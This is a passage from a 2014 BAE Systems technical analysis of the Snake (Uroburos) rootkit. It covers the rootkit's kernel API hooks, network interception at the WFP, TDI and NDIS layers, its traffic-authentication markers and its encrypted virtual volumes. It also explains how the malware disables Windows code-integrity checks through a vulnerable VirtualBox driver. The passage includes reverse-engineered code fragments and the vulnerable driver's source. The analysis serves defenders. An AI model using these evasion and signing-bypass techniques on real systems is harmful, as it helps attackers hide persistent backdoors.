BAE Systems Applied Intelligence : Snake Rootkit Report 2014          12
The reason behind the pipes usage is to ‘ legitimise’ the outbound web requests , forcing them to originate from the host firewall-
friendly system services .
Pipe server is a special mode of the injected DLL . In order to switch into that mode , a dedicated thread is spawned to listen for IPC
messages received through the pipes . The memory pipes used by Snake are named as :
• 	  \\.\Pipe\SP[COMPUTERNAME ]
• 	  \\.\Pipe\UP[COMPUTERNAME ]
where [ COMPUTERNAME ] is the name of the host computer .
Apart from GET / POST requests , the pipe clients ( infected usermode processes ) may also ask the pipe server to perform other
operations on their behalf , such as saving data into a temporary file , copy / delete files , save configuration data into the registry
under the aforementioned ShellCore value .
This delegation of tasks is designed to keep infected processes under the radar of the behavioural analysis tools for as long as
possible . Another reason is to overcome account restrictions imposed on a browser process in order to be able to write into files/
registry .
To delegate different types of tasks , the clients send messages to the pipe server using the following task identification headers :
• 	    DATA
• 	    CREATE
• 	    CMD
• 	    POST
• 	    GET
• 	    DEL
• 	    REGISTR
• 	    COPY
The usermode component of Snake communicates with its kernel - mode driver via a device called \\.\vstor32 ( created under
kernel as \Device\vstor32 ) . In its communication protocol with the driver it uses the IOCTL code of 0x222038 .
To write data , it opens the device with CreateFile(“\\.\vstor32 ” ) , then calls DeviceIoControl ( ) API on its handle with
IOCTL code of 0x222038 .
Configuration parameters along with the initial set of domain names are hard - coded within the body of the DLL . However , the data
appears to be defined in the structures , so it is very likely the DLL could be generated by a stand - alone builder that ‘ patches’ the
DLL with the new / updated list of C&C.
Analysis of the commands performed by the malware suggests the following capabilities :
• 	    Scan the network for the presence of other hosts ( maximum 1 hour is allocated for this task )
• 	    Set maximum upload file size
• 	    Go ‘ stealth’ mode for the specified number of days - Snake will not initiate any connections during that time
• 	    Run specified shell commands and collect the output logs for further delivery
• 	    Modify settings stored with the registry key HKLM\Software\Microsoft\Windows\CurrentVersion\ShellCore
• 	    Search for files
• 	    Upload specified files
• 	    Add new C&C domains
• 	    Update the driver with a new version
• 	    Download files
• 	    Run specified executable files
• 	    Set self - deactivation timeout
• 	    If the virtual partition \\.\vd1 exists , copy all Snake logs into that partition
Together , these commands provide complete backdoor functionality , allowing remote attacker full control over the compromised
system .
The ability to update the driver and then rely on its communication capabilities means that the components of Snake are flexible ,
making possible the existence of the hybrid ( kernel - centric and usermode - centric ) architectures .
For example , the virtual partitions are used by kernel - centric Snake variants , where the kernel - mode driver is responsible for the
communications . If such a driver is installed via an update , the usermode component can be instructed to delegate the file upload
task to the driver by copying all the necessary logs into the shared virtual partition , physically located on the compromised host and
thus , accessible from kernel .
BAE Systems Applied Intelligence : Snake Rootkit Report 2014            13
KERNEL - CENTRIC ARCHITECTURE
This particular architecture relies on a kernel - mode driver to carry out the network communications . The usermode DLLs are still
injected into the system processes to perform high - level tasks .
The delivery mechanism is not known : it may be distributed via a thumb - drive , a phishing email attachment , or be delivered via an
exploit across the network ( e.g. by using the reconnaissance tool that is explained later ) .
Infection starts from a dropper penetrating into the compromised system where it is allowed to run . Once executed , the dropper
installs the kernel mode driver in a pre - defined location . The dropper itself is 32-bit , so it will run both on 32-bit and 64-bit Windows
OS ( in WoW64 mode ) . On a 32-bit OS , it will install a 32-bit driver . On a 64-bit OS , it will install a 64-bit driver .
The analysed 32-bit dropper creates a driver in the following location :
% windows%\$NtUninstallQ817473$\fdisk.sys
However , different samples may use a different path and driver file name . For example , some samples exposed these filenames :
fdisk_32.sys , A0009547.sys , or Ultra3.sys . The filename of the dropper could be rkng_inst.exe or fdisk_mon.exe .
REGISTRATION
Once executed , the driver first makes sure it is registered under a pre - defined name , such as Ultra3 .
Other samples may have a different registration name , such as ~ROOT . The registration is ensured with creation of the following
registry entries :
ErrorControl = 0
Group = “ Streams Drivers ”
ImagePath = % windows%\$NtUninstallQ817473$\fdisk.sys
Start = 1 [ SYSTEM ]
Type = 1
in the newly created registry key
HKEY_LOCAL_MACHINE\System\CurrentControlSer\Services\Ultra3
The driver then flags the following events with the notification purposes :
\BaseNamedObjects\{B93DFED5 - 9A3B-459b - A617 - 59FD9FAD693E }
\BaseNamedObjects\shell.{F21EDC09 - 85D3 - 4eb9 - 915F-1AFA2FF28153 }
The rootkit then places a number of the hooks .
SYSTEM HOOKS
The first API it hooks is IoCreateDevice ( ) . The installed hook handler calls the original API and then checks if the name of the
device is netbt or afd . If so , it will install a TDI filter driver . If the device name is Null , Beep , tcpip or Nsiproxy , it will activate
itself by enabling its hooks designed to hide the presence of Snake on a system , set up its access control lists and the messaging
system .
In order to hide its components , the driver hooks the following APIs :
• 	  ZwQueryKey
• 	  ZwEnumerateKey
• 	  ZwCreateKey
• 	  ZwSaveKey
• 	  ZwReadFile
• 	  ZwQuerySystemInformation
• 	  ZwQueryInformationProcess
• 	  ZwClose
• 	  ZwTerminateProcess
• 	  ZwShutdownSystem
• 	  ObOpenObjectByName
BAE Systems Applied Intelligence : Snake Rootkit Report 2014            14
For example , the hook handlers of the registry - related APIs will block access to the registry entries that contain the name of the
driver . In one example , the rootkit blocks access to registry entries that contain the strings “ Ultra3 ” and “ ~ROOT ” .
The ZwReadFile ( ) hook handler will block access to the home directory where the rootkit keeps its file . In one of the analysed
kernel - centric Snake samples the home directory was hard - coded as % windows%\$NtUninstallQ817473 $ , so it blocked file
read access from that directory .
The ZwClose ( ) hook handler is used to inject the DLL module into the userland processes .
The hook handler for ZwTerminateProcess ( ) checks if the process being shut down is svchost.exe . If so , it considers
it to be a system shutdown , so it unloads its usermode DLL and deactivates its own network drivers , just like it does when its
ZwShutdownSystem ( ) hook handler gets invoked .
The ObOpenObjectByName ( ) hook is designed to hide the presence of its virtual partitions ( described later ) .
To encrypt data stored on its virtual partitions , the driver sets a hook for another API :
IofCallDriver ( )
To re - infect the usermode process svchost.exe and to re - enable its network drivers , the rootkit hooks these APIs :
• 	  ZwCreateThread
• 	  ZwCreateUserProcess
WFP CALLOUT DRIVER
Snake then proceeds to the task of deep packet inspection and modification .
In order to accomplish it , it registers a callout driver for Windows Filtering Platform ( WFP ) , an architecture first introduced with
Windows Vista and nowadays normally used by antivirus and/or intrusion detection systems to inspect / block malicious traffic .
Snake sets filters at the layers FWPM_LAYER_STREAM_V4 and FWPM_LAYER_ALE_FLOW_ESTABLISHED_V4 in the TCP/
IP stack , so that its callout driver is notified whenever a TCP connection is established by a browser . When that happens , the
rootkit triggers an event named \BaseNamedObjects\wininet_activate . When the data arrives , it is intercepted with the
FwpsCopyStreamDataToBuffer0 ( ) API , and then scanned for the presence of the hidden commands from C&C.
The driver inspects bidirectional network data on a per stream basis , as it ’s located right on the stream data path . An ability to
manipulate data streams is provided with the packet injection logic below , allowing Snake to covertly insert traffic destined to its
C&C servers :
01     int _ _ stdcall stream_inject(int flowHandle , int calloutId , int layerId )
02     {
03         int iRet = 0 ;
04         int ntStatus = FwpsAllocateNetBufferAndNetBufferList(m_hNdisNblPool , 0 , 0 , 0 , 0 , & iRet ) ;
05         if ( ! ntStatus )
06         {
07             ntStatus = _ FwpsStreamInjectAsync(m_hInjection ,
08                                                0 ,
09                                                0 ,
10                                                flowHandle ,
11                                                calloutId ,
12                                                layerId ,
13                                                20 ,
14                                                3 ,
15                                                iRet ,
16                                                0 ,
17                                                sStreamInjectCompletion ,
18                                                0 ) ;
19         if ( ! ntStatus )
20         {
21             iRet = 0 ;
22         }
23         if ( iRet )
24         {
25            FwpsFreeNetBufferList(iRet ) ;
26         }
27         return ntStatus ;
28     }
BAE Systems Applied Intelligence : Snake Rootkit Report 2014            15
In order to qualify as a browser , the usermode process must have any of the following names :
01     bool isBrowserProcess(const wchar_t * szProcName )
02     {
03         return ! wcsicmp(szProcName , L”iexplore.exe ” ) ||
04                ! wcsicmp(szProcName , L”firefox.exe ” ) ||
05                ! wcsicmp(szProcName , L”opera.exe ” ) ||
06                ! wcsicmp(szProcName , L”netscape.exe ” ) ||
07                ! wcsicmp(szProcName , L”mozilla.exe ” ) ||
08                ! wcsicmp(szProcName , L”chrome.exe ” ) ;
09     }
TDI FILTER DRIVER
In addition to WFP , Snake also hooks the Transport Driver Interface ( TDI ) network routines by setting itself up as a TDI filter driver .
TDI is considered deprecated and will be removed in future versions of Microsoft Windows , but it ’s still supported on Windows 7 .
Being registered as a TDI driver on the device stack , Snake hooks TCP calls . This way it intercepts all requests along with their
parameters via IRP ( IO request package ) hooks .
By ‘ sniffing’ all the requests , it can now inspect the traffic , looking for and then parsing GET / POST HTTP requests and also SMTP
communications , in order to distinguish commands addressed to itself .
If the rootkit detects that the OS version is pre - Vista ( e.g. Windows XP ) or Windows Server 2008 ( e.g. Windows Server 2003 ) , it will
invoke FwpsStreamInjectAsync0 ( ) API in order to generate outbound requests .
Whenever the client establishes connections , the TDI driver will also ‘ pulse’ the \BaseNamedObjects\wininet_activate
event , just like the WPF driver ’s component of it , in order to notify the userland service about the event .
The data that the driver intercepts , along with the important notifications , is passed to the userland DLL to be processed . If the
data contains commands from C&C , the DLL module is expected to execute them and report results back to the driver to be
delivered back to C&C.
NDIS HOOKING
For NDIS versions 5.X , Snake rootkit contains code that installs NDIS filter intermediate driver .
This driver is set up above a miniport driver ( a driver that communicates with the physical device ) and below a protocol driver ( a
driver that implements a protocol , e.g. TCP / IP ) .
The driver is registered with NdisIMRegisterLayeredMiniport ( ) API .
After that , the drivers hooks the following exports within ndis.sys :
• 	  NdisIMRegisterLayeredMiniport
• 	  NdisTerminateWrapper
The rootkit contains code that installs NDIS filter driver for NDIS 6.0 and above :
Unique name : { c06b1a3b-3d16 - 4181 - 8c8d-7015bfc5b972 }
User - readable description : filter_c06b1a3b
NDIS filter driver configuration is stored in the registry entry :
HKLM\SYSTEM\CurrentControlSet\Control\Network\{4d36e974-e325 - 11ce - bfc1 - 08002be10318 }
The driver is registered with NdisFRegisterFilterDriver ( ) API .
BAE Systems Applied Intelligence : Snake Rootkit Report 2014            16
After that , the drivers hooks the following exports within ndis.sys ( for NDIS 6.0 ) :
• 	  NdisFRegisterFilterDriver
• 	  NdisFDeregisterFilterDriver
• 	  NdisSetOptionalHandlers
• 	  NdisFSetAttributes
Another set of exports it attempts to hook in ndis.sys ( for NDIS 6.0 ) is :
• 	  NdisMRegisterMiniportDriver
• 	  NdisMDeregisterMiniportDriver
• 	  NdisMIndicateReceiveNetBufferLists
• 	  NdisMRestartComplete
• 	  NdisMPauseComplete
With the hooks installed , whenever the network adapter driver attempts to register to NDIS , or whenever there is an attempt to
install NDIS intermediate driver or NDIS filter driver , the hook handlers will register Snake ’s own MiniportXxx functions with the NDIS
library .
With its own miniport handler functions , it can send / receive data by using a private TCP / IP stack , bypassing all firewall hooks , and
making its open ports invisible to scanners .
NDIS PROTOCOL DRIVER
The Snake rootkit registers itself as Network Driver Interface Specification ( NDIS ) protocol driver .
Intercepting Network Data                                               Whenever the underlying miniport driver
receives data from the network , it calls NDIS
by invoking a data receive indication function
NdisMIndicateReceiveNetBufferLists ( )
NdisMIndicateReceiveNetBufferLists ( ) .
NDIS Protocol                                         Miniport
NDIS                                      When that happens , NDIS invokes Snake ’s hook function
Driver                                              Driver
( ProtocolReceiveNetBufferLists ) to process the
ProtocolReceiveNetBufferLists ( )                                      received data .
Sending Network Data                                                    To send the data back , the protocol driver defines the data
in a list of NET_BUFFER_LIST structures , and then passes
MiniportSendNetBufferLists ( )
them to NDIS by calling NdisSendNetBufferLists ( ) .
NDIS Protocol                                        Miniport
NDIS                                      NDIS , in turn , calls the miniport driver ’s
Driver                                             Driver
MiniportSendNetBufferLists ( ) function to forward
NdisSendNetBufferLists ( )                                         the data to an underlying miniport driver .
Being able to fully manipulate traffic at 3 different levels ( NDIS protocol driver , TDI Driver , and WPF callout driver ) , Snake is able to
‘ inject’ the traffic into existing communications to reach out to external components , and at the same time parse all incoming traffic
to detect traffic addressed to itself :
Infected User         Injected
Traffic Interception                                  Application         Module
0xDEADBEAF/0xC001BA5E
Checks
WFP            TDI           NDIS
Internet                                                                                         Memory
pipes
Traffic
Injection
Snake ’s Kernel Mode Driver
BAE Systems Applied Intelligence : Snake Rootkit Report 2014            17
DEAD BEEF ON A COOL BASE
As the driver intercepts all connections ( e.g. on TDI_RECEIVE TDI event or ClientEventReceive ( ) event notification triggered
through its TDI Filter Driver ) , it parses all incoming HTTP and SMTP traffic to see if it can be authenticated as Snake traffic .
The authentication is implemented by decrypting the data and making sure it starts with the markers 0xDEADBEAF and
0xC001BA5E ( which appear to derive from ‘ DEAD BEEF’ and ‘ COOL BASE’ ) .
Here are specific steps :
• 	    The data it accepts should start from a 10 byte signature with the following rules :
• 	      the first 8 bytes must all be ASCII characters , the parser calculates their total sum ( sum ) :
01          for ( int i = 0 ; i < 8 ; i++ )
02          {
03         	       if ( * ( BYTE * ) ptrBuffer < = 32 ||
04         	           * ( BYTE * ) ptrBuffer > = 128 )
05         	 {
06         		 return 0 ;                                            // if not ASCII , quit
07         	 }
08         	       sum + = * ( BYTE * ) ptrBuffer ;                     // add to sum
09         	       + + ptrBuffer ;                                   // advance buffer pointer
10          }
• 	      9th byte must be equal to sum / 26 + 65
• 	      10th byte must be equal to 122 - sum % 26
01          if ( ( * ( BYTE * ) ptrBuffer ! = sum / 26 + 65 ) ||
02              ( * ( BYTE * ) ( ptrBuffer + 1 ) ! = 122 - sum % 26 ) )
03          {
04                 result = 0 ;
05          }
• 	     Starting from the 11th byte , the data must be base64-encoded ; the parser decodes that data
01           base_64_decode(abyBuffer + 10 ,
02                          & ptrDecoded ,
03                          iMaxLength - 10 ) ;
• 	    Once decoded , the decrypted data should contain the aforementioned markers :
.text : F6751426               lea           eax , [ ebp+dwMarker ]                             ; return marker here
.text : F6751429               push          eax
.text : F675142A               mov           ecx , [ ebp+buf_len ]                              ; traffic ’s buffer length
.text : F675142D               push          ecx
.text : F675142E               mov           edx , [ ebp+abyBuffer ]                            ; traffic ’s buffer pointer
.text : F6751431               push          edx
.text : F6751432               call          decrypt_traffic                                 ; decrypt traffic first
.text : F6751437               test          eax , eax
.text : F6751439               jz            short exit                                      ;    if failed , exit
.text : F675143B               mov           eax , [ ebp+dwMarker ]                             ;    check the returned marker
.text : F675143E               cmp           eax , _ DEADBEAF                                  ;    _ DEADBEAF dd 0DEADBEAFh
.text : F6751444               jnz           short exit                                      ;    if not 0xDEADBEAF , exit
.text : F6751446               cmp           [ ebp+dwNextDword ] , 0C001BA5Eh                   ;    check next DWORD
.text : F675144D               jnz           short next                                      ;    if not 0xC001BA5E , exit
• 	     When the traffic is authenticated , its contents is then parsed by using “ GET ” , “ POST ” , “ http:// ” , “ HTTP/ ” ,
“ Content - Length ” , “ Connection ” , “ close ” tags , in order to retrieve HTTP requests
• 	     SMTP traffic is also parsed , only by using “ MAIL “ , “ RCPT “ tags in order to retrieve SMTP characteristics
BAE Systems Applied Intelligence : Snake Rootkit Report 2014    18
By observing such behaviour , one might wonder why the driver is expecting HTTP or SMTP clients ? Why does it act like HTTP / SMTP
server processing client traffic , and serving back normal responses as per the protocol ?
For example , in HTTP the driver will respond with messages like “ HTTP/1.1 200 OK ” or “ HTTP/1.1 500 Server Error ” .
For SMTP traffic , it communicates back normal SMTP server responses , such as “ 250 Sender OK ” , “ 503 Bad sequence of
commands ” , etc .
The reason behind such behaviour is that the driver is acting in this mode like a proxy , routing requests from other infected hosts to
a remote C&C server .
Another opportunity this mode unlocks is a peer - to - peer network mode with no centralised C&C. The infected hosts are capable
of transferring the following peer-2-peer commands defining fragment size , reliability parameters , new peer information , peer
impersonation flags , etc . :
• 	  frag_size
• 	  frag_no_scrambling
• 	  peer_frag_size
• 	  read_peer_nfo
• 	  write_peer_nfo
• 	  imp_level
• 	  reliable_n_tries
• 	  reliable_keepalive
• 	  reliable_rtt
• 	  reliable_padding
• 	  reliable_no_keepalive
• 	  m2b_raw
• 	  psk
• 	  key
Once the incoming data is authenticated and decrypted , the driver passes it to the DLL by using memory pipes .
For example , on HTTP traffic arrival it may send traffic data into a memory pipe \Device\NamedPipe\isapi_http , and then ,
send a received peer-2-peer command message write_peer_nfo=[IP_ADDRESS : PORT]0frag_no_scrambling = Y0 into
another memory pipe called \Device\NamedPipe\isapi_dg .
In order to log its activity , the driver writes log data into the pipe \Device\NamedPipe\isapi_log , so that the DLL could log the
data into the log files .
Full list of the named pipes used for communications is provided below :
• 	  \Device\NamedPipe\isapi_http
• 	  \Device\NamedPipe\isapi_log
• 	  \Device\NamedPipe\isapi_dg
• 	  \Device\NamedPipe\services_control
Messages submitted into the pipes are wrapped into the structures . The structures appear to contain headers to allow the pipe
server , that runs within an infected userland module , to identify the messages first and then unwrap the structures accordingly .
For example , the message headers could be :
• 	  domc.np
• 	  frag.np
Once received from the pipes and unwrapped / decoded , the data is then handled by the usermode DLL as per the data intention -
whether it ’s a traffic sniffing task , a peer-2-peer client logic , a logging task , or a task of saving received files into the virtual volumes .
BAE Systems Applied Intelligence : Snake Rootkit Report 2014              19
VIRTUAL FILE VOLUMES
The driver creates virtual file volumes for encrypted storage of its files and configuration data :
• 	  \\.\Hd1
• 	  \\.\Hd2
The volumes are mounted from the virtual file systems RawDisk1 and RawDisk2 .
The first partition is created with the following steps :
• 	    the driver creates a 100Mb ( 0x6400000 bytes ) file % windows%\$NtUninstallQ817473$\hotfix.dat by calling
IoCreateFile ( ) API
• 	    then it creates a section object with the flags SEC_COMMIT and SEC_NOCACHE ( 0x18000000 ) by calling
ZwCreateSection ( ) ; the flags mean the file is mapped into memory , the entire range of pages will be committed
• 	    next , it maps a view of the created section into the virtual address space by calling ZwMapViewOfSection ( )
• 	    finally , it creates device \Device\RawDisk1 from the section map and mounts it as \\.\Hd1
The hook installed by the rootkit on IofCallDriver ( ) API provides on - the - fly data encryption / decryption whenever that data is
written to or read from the volume . The encryption algorithm is based on CAST-128 , with the hard - coded key stored in the rootkit
body .
As a result , whenever the data is saved into the volume Hd1 , it will be scrambled on - the - fly , and reflected in the persistent storage
file hotfix.dat , which is physically located within the rootkit ’s ‘ home’ directory :
Z:\WINDOWS\$NtuninstallQ817473$>dir
Volume in drive Z has no label .
Volume Serial Number is 2479 - 98AC
Directory of Z:\WINDOWS\$NtuninstallQ817473 $
13/02/2014         04:47 PM          < DIR >                  .
13/02/2014         04:47 PM          < DIR >                  ..
03/02/2014         01:57 PM                     210,944 fdisk.sys
13/02/2014         04:47 PM               104,857,600 hotfix.dat
2 File(s )           105,068,544 bytes
2 Dir(s )         8,406,433,792 bytes free
Analysis of the hotfix.dat file contents reveals it ’s a fully encrypted file with flat entropy . Thus , it is not possible to reveal the
contents of the Snake ’s volume by accessing the contents of this file ( unless the encryption is broken , that is ) .
Enlisting the contents of the created volume is possible , along with creating files on it :
C:\>echo Test > \\.\Hd1\Test.txt
C:\>type \\.\Hd1\\Test.txt
Test
C:\>dir \\.\Hd1\\
Volume in drive \\.\Hd1 has no label .
Volume Serial Number is BA9B-99E8
Directory of \\.\Hd1
14/02/2014         02:22 PM                              7 Test.txt
1 File(s )                          7 bytes
0 Dir(s )                           0 bytes free
BAE Systems Applied Intelligence : Snake Rootkit Report 2014              20
However , as soon as IofCallDriver ( ) hook is removed , the same ‘ dir’ command will fail , as with no hook the rootkit can not
decrypt the scrambled volume :
C:\>dir \\.\Hd1\\
Incorrect function .
The second volume \\.\Hd2 is not mapped to a file , so when a computer is switched off , its contents is lost . Thus , it could be
used as a temporary or a cache storage . The data stored in \\.\Hd2 is encrypted the same way the first volume ’s data .
Both volumes appear to be set up as FAT volumes .
An attempt to read the data from these volumes with the code below :
01          HANDLE hDisk = CreateFile(“\\\\.\\Hd1 ” ,
02         			                        GENERIC_READ ,
03         			                        FILE_SHARE_READ ,
04         			                        NULL ,
05         			                        OPEN_EXISTING ,
06         			                        0 ,
07         			                        NULL ) ;
08          BYTE lpBuffer[16384 ] ;
09          DWORD dwBytes ;
10          if ( hDisk )
11          {
12         	       ReadFile(hDisk , lpBuffer , 16384 , & dwBytes , NULL ) ;
13         	       // inspect the buffer
14         	 CloseHandle(hDisk ) ;
15          }
This will produce the following results :
For \\.\Hd1 :
0     1     2     3     4     5     6     7     8     9     A     B     C     D     E     F     0123456789ABCDEF
00000000      EB    00    00    00    00    00    00    00    00    00    00    00    02    04    02    00    ................
00000010      02    00    02    00    00    F8    C8    00    20    00    02    00    01    00    00    00    ........ .......
00000020      FF    1F    03    00    80    00    29    E8    99    9B    BA    4E    4F    20    4E    41    ...... ) .... NO NA
00000030      4D    45    20    20    20    20    46    41    54    31    36    20    20    20    00    00    ME     FAT16    ..
00000040      00    00    00    00    00    00    00    00    00    00    00    00    00    00    00    00    ................
For \\.\Hd2 :
0     1     2     3     4     5     6     7     8     9     A     B     C     D     E     F     0123456789ABCDEF
00000000      EB    00    00    00    00    00    00    00    00    00    00    00    02    01    02    00    ................
00000010      02    00    02    FF    7F    F8    7F    00    20    00    02    00    01    00    00    00    ........ .......
00000020      00    00    00    00    80    00    29    E8    99    9B    BA    4E    4F    20    4E    41    ...... ) .... NO NA
00000030      4D    45    20    20    20    20    46    41    54    31    36    20    20    20    00    00    ME     FAT16    ..
00000040      00    00    00    00    00    00    00    00    00    00    00    00    00    00    00    00    ................
The ability to keep its data on TrueCrypt - like volumes provides Snake with a powerful ability to exchange data with the usermode
DLL , as these volumes are accessible both from usermode and kernel mode .
Static analysis of the code reveals that the Snake driver uses virtual volumes to store its data and additional files on it .
For example , it stores its message queue in a file called :
\.\\Hd1\queue
The message queue indicates an asynchronous communication model between kernel mode driver and a usermode DLL ,
e.g. to pass commands , configuration parameters , binary images of additional Snake components .
Other files that may also be found on the virtual volume are : klog , conlog , dump , rkng_inst.exe ,
where rkng_inst.exe could be the name of the original dropper , and other log files could potentially contain executed command
outputs , intercepted keystrokes , and other output logs .
BAE Systems Applied Intelligence : Snake Rootkit Report 2014    21
64-BIT EDITIONS OF WINDOWS
The 64-bit version of Snake must deal with a number of additional security protections implemented in 64-bit editions of Microsoft
Windows , the most significant of which are kernel driver signature validation and Kernel Patch Protection ( more commonly known as
PatchGuard ) .
PatchGuard is a feature of 64-bit Windows which aims to prevent modification of the Windows kernel , something that is often
performed by malware attempting to hide itself on an infected system . Although PatchGuard is successful at preventing kernel
patching once initialised , several published bypass approaches exist4,5 . The technique used by Snake appears to be similar to these
approaches .
The driver signing policy enforced by all 64-bit versions of Windows from Vista onwards requires all kernel - mode drivers to be signed
with a valid digital signature . The Snake dropper contains both 32-bit and 64-bit unsigned drivers , and it can successfully load its
unsigned 64-bit driver on a 64-bit version of Windows XP – as driver signing is not enforced it does not have to resort to any tricks
under this OS version . In this case , in order to ensure the driver is loaded automatically at startup , the dropper can install the 64-bit
driver on 64-bit Windows XP in the same way it installs a 32-bit driver on a 32-bit version of Windows XP .
On 64-bit versions of Windows Vista and above it behaves differently . Firstly , the 64-bit unsigned driver file is created as usual :
% windows%\$NtUninstallQ817473$\fdisk.sys
However , the driver is not registered ; what is registered instead is the dropper itself . To do that , the dropper first copies itself as :
% windows%\$NtUninstallQ817473$\fdisk_mon.exe
The dropper then registers itself as a service to ensure it starts every time Windows is booted , by creating the values :
ErrorControl = 0
Type = 16
Start = 2
ImagePath = ” % SystemRoot%\$NtUninstallQ817473$\fdisk_mon.exe
ObjectName = ” LocalSystem ”
WOW64 = 1
in the registry key :
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Ultra3
Now comes the most interesting part : does the dropper manage to load its 64-bit unsigned driver under 64-bit versions of Windows
Vista and later versions , such as 64-bit Windows 7/8 ? The answer : Yes , it does .
Does it resort to using bootkit technology , which has been used in the past to bypass protections to load unsigned 64-bit drivers ?
The answer : No . Bootkits must overwrite the Master Boot Record ( MBR ) and antivirus products are well trained to catch that kind of
bad behavior .
The masterminds behind Snake rootkit seem to be well aware of this so what they resorted to instead is leveraging a vulnerability
in a well - known virtualization product called VirtualBox , a product made by Oracle which is widely used by researchers to analyse
malware . VirtualBox driver version 1.6.2 was released in June 2 , 2008 . Two months later , in August 2008 , security researchers
reported that its main driver component , which is signed under the entity “ innotek Gmbh ” , contained a privilege escalation
vulnerability6 .
In a nutshell , the VirtualBox software installs a driver called VBoxDrv . The driver is controlled with the Input / Ouput Control Codes
( 32-bit values called IOCTL ) passed along DeviceIoControl ( ) API . One of the documented transfer methods that the system
uses to pass data between the caller of DeviceIoControl ( ) API and the driver itself is called METHOD_NEITHER .
As per MSDN documentation7 , METHOD_NEITHER is a special transfer type when Input / Output Request Packet ( IRP ) supplies the
user - mode virtual addresses of the input and output buffers , without validating or mapping them .
4
http://www.codeproject.com/Articles/28318/Bypassing-PatchGuard-3
5
http://uninformed.org/index.cgi?v=3&a=3&p=17
6
http://www.coresecurity.com/content/virtualbox-privilege-escalation-vulnerability
7
http://msdn.microsoft.com/en-us/library/windows/hardware/ff543023(v=vs.85).aspx
BAE Systems Applied Intelligence : Snake Rootkit Report 2014               22
It is the responsibility of the driver to validate the addresses sent from user mode in order to make sure those addresses are valid
usermode addresses .
The source code of the vulnerable driver ( shown below ) demonstrates how the integer value of the rc variable is first derived from
the input parameters pDevObj ( device object ) and pIrp ( request packet ) . Next , that integer value is written into the UserBuffer - an
arbitrary address , pointed by the input parameter pIrp ( request packet ) . As there are no validations made for the UserBuffer an
attacker can craft such input parameters that will define address within kernel memory to patch and the data to patch it with :
01      / * *
02        * Device I / O Control entry point .
03        *
04        * @param    pDevObj      Device object .
05        * @param    pIrp         Request packet .
06        * /
07      NTSTATUS _ stdcall VBoxDrvNtDeviceControl(PDEVICE_OBJECT pDevObj , PIRP pIrp )
08      {
09          PSUPDRVDEVEXT        pDevExt = ( PSUPDRVDEVEXT)pDevObj->DeviceExtension ;
10          PIO_STACK_LOCATION pStack = IoGetCurrentIrpStackLocation(pIrp ) ;
11          PSUPDRVSESSION       pSession = ( PSUPDRVSESSION)pStack->FileObject->FsContext ;
12
13          ULONG ulCmd = pStack->Parameters . DeviceIoControl . IoControlCode ;
14
15          if ( ulCmd = = SUP_IOCTL_FAST_DO_RAW_RUN
16            || ulCmd = = SUP_IOCTL_FAST_DO_HWACC_RUN
17            || ulCmd = = SUP_IOCTL_FAST_DO_NOP )
18          {
19             int rc ;
20     	          ...
21             rc = supdrvIOCtlFast(ulCmd , pDevExt , pSession ) ;
22
23     	           //    supdrvIOCtlFast ( ) function itself will return :
24     	           //    pDevExt->pfnVMMR0EntryFast(pSession->pVM , SUP_VMMR0_DO_NOP ) ;
25     	           //    the function depends pDevExt and pSession , which in turn
26     	           //    are derived from the input parameters pDevObj and pIrp
27                 //    therefore , rc value can be manipulated
28              _ _ try
29              {
30                                                            // save the manipulated rc value back into
31                 * ( int * ) pIrp->UserBuffer = rc ;              // the input parameter ( the address to patch )
32              }
33              _ _ except(EXCEPTION_EXECUTE_HANDLER )
34              {
35                 ...
36              }
37          }
38      }
Now that the vulnerable driver can be used as a weapon to patch kernel memory , all the malware needs to do is to patch the content
of the variable nt!g_CiEnabled , a boolean variable “ Code Integrity Enabled ” that marks whether the system was booted in
WinPE mode .
When running in WinPE mode there is no Code Integrity control , therefore by enabling this mode by patching only one bit ,
Code Integrity verification is disabled so that the unsigned 64-bit driver can be loaded .
This variable is used within the function SepInitializeCodeIntegrity ( ) , implemented within CI.dll ’s function
CiInitialize ( ) and imported by the NT core ( ntoskrnl.exe ) . In order to find the variable in kernel memory , the Snake
dropper loads a copy of the NT core image ( ntoskrnl.exe ) , locates the import of CI.dll ’s function CiInitialize ( ) , and then
SepInitializeCodeIntegrity ( ) within it . Then it parses the function ’s code to locate the offset of the variable .
Once located , the content of the variable nt!g_CiEnabled is patched in kernel memory and the 64-bit unsigned driver is loaded .
This explains why Snake dropper registers itself as a service to start each time Windows starts : in order to install the vulnerable
VBox driver first , then pass it a malformed structure to disable Code Integrity control with a DeviceIoControl ( ) API call , and
finally , load the driver .
In order to be able to perform the steps above , the dropper must first obtain Administrator privileges . It attempts to do this by
running MS09 - 025 and MS10 - 015 exploits on the target system . These exploits are bundled within the dropper in its resource
section as executable files . Other resources embedded within the dropper are the 32-bit and 64-bit builds of its driver , a tool for
creating NTFS file systems , and the initial message queue file which is written into the virtual volume . The message queue file
contains configuration data and the libraries that will be injected into usermode processes .
BAE Systems Applied Intelligence : Snake Rootkit Report 2014             23
USERMODE DLLS
The usermode DLLs injected by the kernel - mode driver into the userland system process ( e.g. explorer.exe ) are :
• 	      32-bit Windows OS :
• 	  rkctl_Win32.dll
• 	  inj_snake_Win32.dll
• 	      64-bit Windows OS :
• 	  rkctl_x64.dll
• 	  inj_snake_x64.dll
The rkctl_Win32.dll / rkctl_x64.dll module uses the following hard - coded named pipe for communications :
\\.\pipe\services_control
The remote commands it receives appear to be designed to control other components of Snake :
• 	      tc_cancel                                                  • 	     tc_free_data
• 	      config_read_uint32                                         • 	     tc_get_reply
• 	      tr_free                                                    • 	     tc_read_request_pipe
• 	      tr_alloc                                                   • 	     tc_send_request_bufs
• 	      tc_send_request                                            • 	     t_close
• 	      tr_write_pipe                                              • 	     tc_socket
• 	      snake_modules_command                                      • 	     snake_free
• 	      t_setoptbin                                                • 	     snake_alloc
The inj_snake_Win32.dll / inj_snake_x64.dll module exports 61 functions . It is designed to perform the high - level tasks
such as :
• 	      manage the configuration data ( by using a queue )
• 	      exfiltrate data by using Windows Internet ( WinINet ) APIs or Windows Sockets 2 ( Winsock ) APIs :
• 	    communicate with the C&C server and receive commands to execute
• 	    submit logs to the C&C server and other reports
When the DLL activates , it reads configuration parameters from the configuration queue , that the driver creates on a virtual volume .
One of the parameters defines the pipe name(s ) that the DLL should use for its communications .
The remote commands received by this Snake DLL module are designed to set up various communication parameters :
• 	     http_log                                                 • 	     redir_str
• 	     http_no_pragma_cache                                     • 	     http_max_opt
• 	     http_no_accept                                           • 	     http_option
• 	     proxy_useragent                                          • 	     http_uri
